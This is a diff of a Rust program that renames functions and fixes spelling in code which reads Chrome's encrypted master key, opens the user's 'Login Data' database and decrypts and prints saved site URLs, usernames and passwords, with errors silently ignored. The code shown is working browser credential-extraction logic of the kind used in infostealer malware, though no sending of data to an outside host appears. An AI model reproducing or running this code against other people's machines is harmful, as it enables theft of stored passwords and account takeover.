@@ -18,7 +18,7 @@ fn main() {
             let e = || -> Result<(), Box<dyn std::error::Error>> {
                 let mut key = read_master_key()?;
                 let master_key = decrypt_master_key(&mut key)?;
-                sqlite_shit(&master_key)?;
+                extract_passwords(&master_key)?;
                 Ok(())
             };
             if let Err(_) = e() {}
@@ -83,7 +83,7 @@ unsafe fn decrypt_master_key(et_bytes: &mut Vec<u8>) -> Result<Vec<u8>, Box<dyn 
     }
 }
 
-fn sqlite_shit(key: &Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
+fn extract_passwords(key: &Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
     let home_folder = std::env::var("USERPROFILE")?;
     let mut login_data_path = path::PathBuf::from(home_folder);
     login_data_path.push(r"AppData\Local\Google\Chrome\User Data\default\Login Data");
@@ -105,7 +105,7 @@ fn sqlite_shit(key: &Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
         let username_value = statement.read::<String>(1)?;
         let password_value = statement.read::<Vec<u8>>(2)?;
 
-        let decrypted_pass = decyrpt_password(&password_value, &key)
+        let decrypted_pass = decrypt_password(&password_value, &key)
             .unwrap_or("<couldn't decrypt password>".as_bytes().to_vec());
         println!(
             "{}; {}; {}",
@@ -118,7 +118,7 @@ fn sqlite_shit(key: &Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
-fn decyrpt_password(password: &Vec<u8>, key: &Vec<u8>) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+fn decrypt_password(password: &Vec<u8>, key: &Vec<u8>) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let iv = &password[3..15];
     let payload = &password[15..];
 
